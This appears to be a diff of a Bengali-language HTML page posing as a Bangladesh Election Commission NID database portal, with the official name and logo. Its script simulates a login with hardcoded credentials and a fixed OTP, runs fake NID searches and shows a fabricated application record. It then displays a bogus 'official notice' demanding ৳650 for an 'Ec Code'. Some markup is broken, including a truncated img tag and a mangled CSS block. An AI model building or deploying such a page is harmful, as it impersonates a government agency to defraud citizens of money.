@@ -1,80 +1,441 @@
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>বাংলাদেশ নির্বাচন কমিশন</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>বাংলাদেশ নির্বাচন কমিশন ডাটাবেইজ কার্ড ম্যানেজমেন্ট</title>
+  <style>
+    *{box-sizing:border-box}
+    body{font-family:'Segoe UI',Roboto,Arial,sans-serif;background:#f6f9f6;margin:0;color:#222}
+    header {
+      background: #003366;
+      color: white;
+      padding: 15px 20px;
+      text-align: center;
+    }
+    .logo {
+      width: 140px;
+      height: auto;
+      position: fixed;
+      top: 10px;
+      left: 20px;
+      z-index: 1000;
+      background: #003366
+      padding: 8px;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+    }
+    .container {
+      max-width: 1200px;
+      margin: 90px auto 40px;
+      padding: 20px;
+    }
+    .login-box, .dashboard, .page-section {
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.12);
+      margin: 20px auto;
+    }
+    h2 {
+      color: #003366;
+    }
+    input[type="text"], input[type="password"], button {
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 16px;
+      width: auto;
+      box-sizing: border-box;
+    }
+    button {
+      background: #003366;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #001f3f;
+    }
+    .hidden {
+      display: none;
+    }
+    .side-menu {
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+      margin: 30px 0;
+    }
+    .side-btn {
+      background: #005588;
+      color: white;
+      padding: 14px 35px;
+      font-size: 18px;
+      border-radius: 6px;
+      cursor: pointer;
+      min-width: auto;
+    }
+    .side-btn:hover {
+      background: #004070;
+    }
+    .back-btn {
+      background: #003366;
+      margin-bottom: 15px;
+      width: auto;
+      padding: 10px 15px;
+    }
+    .loader {
+      text-align: center;
+      padding: 50px;
+      font-size: 20px;
+      color: #003366;
+      font-weight: bold;
+    }
+    .loader::after {
+      content: ".";
+      animation: pulse 2.5s infinite;
+    }
+    @keyframes pulse { 0%,100% {opacity:1;} 50% {opacity:0.4;} }
+    .eye-icon {
+      cursor: pointer;
+      font-size: 20px;
+      color: #003366;
+      text-decoration: none;
+    }
+    .Ec-msg{
+      color:#b00000;
+      font-weight:700;
+      font-size:16px;
+      line-height:1.6;
+      background:#fff;
+      border:1px solid #cc0000;
+      border-left:6px solid #cc0000;
+      padding:10px 18px;
+      border-radius:4px;
+      margin-top:12px;
+      box-shadow:0 2px 6px rgba(0,0,0,0.08);
+    }
+    .Ec-msg strong{
+      display:block;
+      font-size:16px;
+      margin-bottom:10px;
+      color:#8b0000;    
+    }
+    .top{display:flex;padding:18px 20px;gap:18px;align-items:flex-start}
+    .filters{flex:1;border-right:1px solid #e6e6e6;padding-right:20px}
+    .fields-panel{width:260px}
+    .filters h3{margin:0 0 12px 0;font-size:16px;color:#0b3a6e}
+    .filter-row{display:flex;gap:10px;align-items:center;margin-bottom:12px}
+    .check{width:22px;height:22px;border:1px solid #c9c9c9;border-radius:3px;background:#fff;display:inline-block}
+    label.field-label{width:120px;font-size:14px;color:#333}
+    select,input[type="text"]{padding:8px 10px;border:1px solid #cfcfcf;border-radius:4px;min-width:160px}
+    select.small{width:70px}
+    .search-btn{
+      display:inline-block;
+      margin-top:6px;
+      padding:8px 16px;
+      height:40px;
+      border:1px solid #003366;
+      background:#003366;
+      color:#fff;
+      border-radius:6px;
+      cursor:pointer;
+    }
+    .page-btn{
+      padding:6px 12px;
+      height:36px;
+      border-radius:6px;
+      border:1px solid #003366;
+      background:#003366;
+      color:#fff;
+      min-width:38px;
+    }
+    .page-btn.active{
+      background:#0b63b6;
+      border-color:#0b63b6;
+    }
+    .panel{background:#99ccffbb;border:1px solid #ddd;padding:10px;border-radius:3px;height:230px;overflow:auto}
+    .panel h4{margin:4px 0 8px 0;font-size:14px}
+    .panel p{margin:6px 0;color:#222}
+    .table-wrap{padding:6px 12px 22px}
+    table{width:100%;border-collapse:collapse;background:#fff}
+    thead th{background:#f7f7f7;padding:14px 10px;text-align:left;border-bottom:1px solid #e6e6e6;font-weight:700;color:#222}
+    tbody td{padding:14px 10px;border-bottom:1px solid #f0f0f0;vertical-align:middle}
+    tbody tr:nth-child(odd){background:#fff}
+    .col-id{width:16%}.col-name{width:14%}.col-nid{width:12%}.col-date{width:12%}.col-status{width:12%}
+    .muted{color:#777}
+    .chip{display:inline-block;padding:6px 10px;border-radius:14px;font-size:13px;border:1px solid #d0d0d0;background:#fff}
+    .chip.rejected{background:#fff2f2;border-color:#ef9a9a;color:#a94442}
+    .chip.completed{background:#f2fff6;border-color:#9fe6b8;color:#2f7f3a}
+    .footer{display:flex;justify-content:space-between;align-items:center;padding:12px 18px;background:#fafafa;border-top:1px solid #eee}
+@media (max-width:900px){
+  .top{
+    flex-direction:column;
+    height:(max-width:900px){
+  .top{
+  }
 
-<style>
-body{
-  font-family:Arial,sans-serif;
-  margin:0;
-  background:#f6f7f8;
-  color:#222
-}
+  .fields-panel{
+    width:100%;
+    height:300%;       /* height যোগ করা হলো */
+  }
 
-header{
-  background:#003366;
-  color:#fff;
-  padding:12px;
-  text-align:center
-}
-
-.container{
-  max-width:1100px;
-  margin:80px auto 30px;
-  padding:15px
-}
-
-.login-box{
-  background:#fff;
-  padding:40px 20px;
-  border-radius:6px;
-  box-shadow:0 3px 12px rgba(0,0,0,.1);
-  margin:15px auto;
-  text-align:center
-}
-
-.maintenance-msg{
-  color:#d80000;
-  font-weight:700;
-  font-size:22px;
-  line-height:1.6;
-  background:#ffe6e6;
-  border:2px solid red;
-  padding:20px;
-  border-radius:6px
-}
-
-footer{
-  background:#003366;
-  color:#fff;
-  text-align:center;
-  padding:10px;
-  margin-top:25px
-}
-</style>
+  .filters{
+    border-right:none;
+    padding-right:0;
+    height:300%;       /* height যোগ করা হলো */
+  }
+    .eye-icon{cursor:pointer;text-decoration:none;color:#000}
+    footer{
+      background:#003366;
+      color:white;
+      text-align:center;
+      padding:15px;
+      margin-top:40px;
+    }
+    .search-btn{
+      width:auto !important;
+    }
+  </style>
 </head>
-
 <body>
 
+<img src="https://upload.wikimedia.org/wikipedia/commons/9/9a/Election_Commission_Logo.svg" alt="বাংলাদেশ নির্বাচন কমিশন লোগো" class="log
+
 <header>
-<h2>বাংলাদেশ নির্বাচন কমিশন</h2>
-<p>বাংলাদেশ নির্বাচন কমিশন ডাটাবেইজ</p>
+  <h2>বাংলাদেশ নির্বাচন কমিশন ডাটাবেইজ</h2>
+  <p>বাংলাদেশ নির্বাচন কমিশন ডাটাবেইজ কার্ড ম্যানেজমেন্ট</p>
 </header>
 
 <div class="container">
-  <div class="login-box">
-    <div class="maintenance-msg">
-      কারিগরিক সমস্যার জন্য সার্ভার এর কাজ চলমান। <br>
-      কিছু সময় অপেক্ষা করুন।
+
+  <!-- লগইন -->
+  <div id="loginPage">
+    <div class="login-box">
+      <h2>লগইন করুন</h2>
+      <input type="text" id="userId" placeholder="User ID" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <button onclick="checkLogin()">লগইন</button>
+
+      <div id="otpSection" class="hidden">
+        <input type="text" id="otpInput" placeholder="******" maxlength="6">
+        <button onclick="verifyOTP()">যাচাই করুন</button>
+        <div style="color:#003366; font-weight:bold; text-align:center; margin-top:10px;">
+          018******34 এই নম্বরে ওটিপি রিকুয়েষ্ট পাঠানো হয়েছে। অপেক্ষা করুন।
+        </div>
+      </div>
     </div>
   </div>
-</div>
 
+  <!-- ড্যাশবোর্ড -->
+  <div id="dashboard" class="hidden">
+    <div class="dashboard">
+      <h2>স্বাগতম ড্যাশবোর্ডে</h2>
+      <p>আপনি সফলভাবে লগইন করেছেন।</p>
+
+      <div class="side-menu">
+        <button class="side-btn" onclick="openPage('nidSearch')">NID Search</button>
+        <button class="side-btn" onclick="openPage('cardApp')">Card Application</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- NID Search পেজ -->
+  <div id="nidSearchPage" class="page-section hidden">
+    <button class="back-btn" onclick="backToDashboard()">← ড্যাশবোর্ডে ফিরুন</button>
+    <h2>NID Search</h2>
+    <input type="text" id="nidSearchInput" placeholder="১০/১৭ ডিজিট NID নম্বর দিন" maxlength="17">
+    <button onclick="performNIDSearch()">সার্চ করুন</button>
+    <div id="searchLoader" class="loader hidden"></div>
+  </div>
+
+  <!-- Card Application পেজ -->
+  <div id="cardAppPage" class="page-section hidden">
+    <button class="back-btn" onclick="backToDashboard()">← ড্যাশবোর্ডে ফিরুন</button>
+    <h2>স্মার্ট কার্ড অ্যাপ্লিকেশন</h2>
+
+    <div class="top">
+      <div class="filters">
+        <h3>Search Application</h3>
+
+        <div class="filter-row">
+          <td><input type="checkbox" /></td>
+          <label class="field-label">NID</label>
+          <select class="small">
+            <option>IS</option>
+            <option>EQ</option>
+          </select>
+          <input type="text" id="nidAppInput" value="  " />
+        </div>
+
+        <div class="filter-row">
+          <td><input type="checkbox" /></td>
+          <label class="field-label">Registration ID</label>
+          <select class="small"><option>IS</option></select>
+          <input type="text" placeholder="" />
+        </div>
+
+        <div class="filter-row">
+          <td><input type="checkbox" /></td>
+          <label class="field-label">Issue type</label>
+          <select class="small"><option>IS</option></select>
+          <input type="text" placeholder="" />
+        </div>
+
+        <div class="filter-row">
+          <td><input type="checkbox" /></td>
+          <label class="field-label">Application Status</label>
+          <select class="small"><option>IS</option></select>
+          <input type="text" placeholder="" style="min-width:220px" />
+        </div>
+
+        <div class="filter-row">
+          <td><input type="checkbox" /></td>
+          <label class="field-label">Category</label>
+          <select class="small"><option>IS</option></select>
+          <select>
+            <option></option>
+          </select>
+        </div>
+
+        <button class="search-btn" onclick="performAppSearch()">Search</button>
+      </div>
+
+      <div class="fields-panel">
+        <div class="panel">
+          <h4>Fields</h4>
+          <p>Search Fields</p>
+          <p style="color:#999;font-size:13px">Click on fields to add:</p>
+          <p>Agent ID</p>
+          <p>Application Date</p>
+          <p>Application Status</p>
+          <p>District</p>
+          <p>Category</p> 
+          <p>Nid Search</p>
+          <p>Card Application</p>
+          <p>Mobile Number</p>
+          <p>স্মার্ট কার্ড অ্যাপ্লিকেশন</p>
+          <p>Citizen-Home</p>
+        </div>
+      </div>
+    </div>
+
+    <div id="appResult" class="table-wrap hidden">
+      <table>
+        <thead>
+          <tr>
+            <th style="width:36px"><input type="checkbox" /></th>
+            <th class="col-id">ID</th>
+            <th class="col-name">Name</th>
+            <th class="col-nid">NID</th>
+            <th class="col-date">Applied<br/>Date</th>
+            <th class="col-status">Current<br/>Status</th>
+            <th>Category</th>
+            <th>Issue Type</th>
+            <th>Source</th>
+            <th style="width:60px">Action</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><input type="checkbox" /></td>
+            <td class="muted">NIDCA20812817</td>
+            <td>Atikur Rahman</td>
+            <td id="tableNID">6410857327</td>
+            <td>04/03/1988</td>
+            <td><span class="Status">Pending</span></td>
+            <td>Ga</td>
+            <td>Modified</td>
+            <td class="muted">ONLINE</td>
+            <td style="text-align:center">
+              <span class="eye-icon" onclick="viewDetails()">👁</span>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+
+      <div class="footer">
+        <div>Show 
+          <select style="display:inline-block;padding:4px 6px;margin:0 6px;border:1px solid #d0d0d0;border-radius:3px">
+            <option>10</option><option>25</option>
+          </select> records
+        </div>
+        <div class="muted">Showing 1 to 2 of 2 records</div>
+        <div>
+        <button class="page-btn active">1</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- লোডার যোগ করা হলো (এটাই মূল পরিবর্তন) -->
+    <div id="detailLoader" class="loader hidden">লোড হচ্ছে...</div>
+
+    <div id="EcMessage" class="Ec-msg hidden">
+      <strong>⚠ Ecs অফিসিয়াল নোটিশ</strong> দুঃখীত আপনার পোর্টাল নির্বাচন কমিশনের ডাটাবেইজ এ সংযুক্ত হয়নি, অনুগ্রহ করে জরুরি ভাবে ৳৬৫০ টাকা দিয়ে Ec Code সাবমিট করুন এবং পূনরায় আবার চেষ্টা করুন। ধন্যবাদ। বাংলাদেশ নির্বাচন কমিশন সচিবালয়।
+    </div>
+</div>
 <footer>
-© ২০২৬ বাংলাদেশ নির্বাচন কমিশন (সচিবালয়) | সকল অধিকার সংরক্ষিত
+  © ২০২৬ বাংলাদেশ নির্বাচন কমিশন সচিবালয়ে সকল তথ্য সংরক্ষিত।
 </footer>
 
+<script>
+  function checkLogin() {
+    const userId = document.getElementById('userId').value.trim();
+    const pass = document.getElementById('password').value.trim();
+    if (userId === "Ecsnidbd105" && pass === "Ecsbd0105") {
+      document.getElementById('otpSection').classList.remove('hidden');
+    } else {
+      alert("ভুল User ID বা Password!");
+    }
+  }
+
+  function verifyOTP() {
+    if (document.getElementById('otpInput').value.trim() === "707390") {
+      document.getElementById('loginPage').classList.add('hidden');
+      document.getElementById('dashboard').classList.remove('hidden');
+    } else {
+      alert("ভুল OTP:");
+    }
+  }
+
+  function openPage(page) {
+    document.getElementById('dashboard').classList.add('hidden');
+    document.getElementById(page + 'Page').classList.remove('hidden');
+  }
+
+  function backToDashboard() {
+    document.querySelectorAll('.page-section').forEach(el => el.classList.add('hidden'));
+    document.getElementById('dashboard').classList.remove('hidden');
+    document.getElementById('appResult').classList.add('hidden');
+    document.getElementById('detailLoader').classList.add('hidden');
+    document.getElementById('EcMessage').classList.add('hidden');   // ← এখানে ড্যাশ সরানো হয়েছে
+  }
+
+  function performNIDSearch() {
+    const nid = document.getElementById('nidSearchInput').value.trim();
+    if (!nid) return alert("NID দিন!");
+    document.getElementById('searchLoader').classList.remove('hidden');
+    setTimeout(() => {
+      document.getElementById('searchLoader').classList.add('hidden');
+      alert("কোনো রেজাল্ট পাওয়া যায়নি। আবার চেষ্টা করুন।");
+    }, 2000);
+  }
+
+  function performAppSearch() {
+    const nid = document.getElementById('nidAppInput').value.trim();
+    if (!nid || (nid.length !== 10 && nid.length !== 17)) return alert("সঠিক NID দিন (১০/১৭ ডিজিট)!");
+    document.getElementById('tableNID').textContent = nid;
+    document.getElementById('appResult').classList.remove('hidden');
+  }
+
+  function viewDetails() {
+    document.getElementById('detailLoader').classList.remove('hidden');
+    setTimeout(() => {
+      document.getElementById('detailLoader').classList.add('hidden');
+      document.getElementById('EcMessage').classList.remove('hidden');
+    }, 2500);
+  }
+</script>
 </body>
 </html>
